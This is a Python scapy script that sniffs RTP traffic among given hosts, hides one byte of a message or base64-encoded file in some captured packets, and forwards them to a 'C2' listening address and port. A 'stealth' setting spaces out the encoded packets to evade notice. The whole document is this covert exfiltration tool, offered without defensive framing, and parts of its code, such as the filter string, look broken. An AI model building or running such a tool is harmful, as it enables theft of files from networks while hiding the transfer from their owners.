import argparse
import base64
import binascii
import queue
import time
import scapy.all as scapy
from scapy.all import sendp
from scapy.layers.inet import UDP
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.packet import ls
from scapy.all import bytes_hex
from scapy.layers.inet import Packet


def encodePacket(packet, character):
    rawData = packet[Raw].load
    packet[Raw].load = rawData[:12] + bytes(character, encoding="raw_unicode_escape") + rawData[13:]
    return packet


def changeIPAndPort(packet, address, port):
    packet[IP].dst = address
    packet[UDP].dport = port
    return packet


def sendPacket(packet):
    del packet[UDP].chksum
    del packet[IP].chksum
    sendp(packet, verbose=0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--message", help="String message to send")
    parser.add_argument("-f", "--filename", help="File to send")
    parser.add_argument("-s", "--stealth", help="Number of packet encodings between each RTP transmission")
    parser.add_argument("-d", "--destination_address", help="The destination ipv4 address we send encoded RTP traffic")
    parser.add_argument("-c", "--C2_listening_port", help="The port we forward encoded RTP traffic ro")
    parser.add_argument("-i", "--host_ips", help="The ipv4 addresses of hosts in the RTP session")
    args = parser.parse_args()

    stealthVal = int(args.stealth)
    destinationAddress = args.destination_address
    listeningPort = int(args.C2_listening_port)

    print(args)  # Debugging
    if args.filename is not None:
        file = open(args.filename, 'rb')
        transmissionString = base64.b64encode(file.read())
        file.close()
    else:
        transmissionString = args.message

    packetQ = queue.Queue()
    sessionHostList = args.host_ips.split(",")
    filterString = f"dst host {sessionHostList} "
    for h in sessionHostList[1:]:
        filterString += f"or dst host {h} "
    asyncSniffer = scapy.AsyncSniffer(filter=filterString, prn=lambda x: packetQ.put(x))
    asyncSniffer.start()

    encodedPackets = 0
    sentPackets = 0
    while encodedPackets < len(transmissionString):
        if packetQ.qsize() > 0:
            pkt = packetQ.get()
            if pkt.haslayer(IP):
                if sentPackets == 0:
                    sendPacket(encodePacket(changeIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
                    encodedPackets += 1
                    print(f"Percentage complete: {encodedPackets / len(transmissionString)}%")
                else:
                    sendPacket(changeIPAndPort(pkt, destinationAddress, listeningPort))
                sentPackets = (1 + sentPackets) % stealthVal

    asyncSniffer.stop()
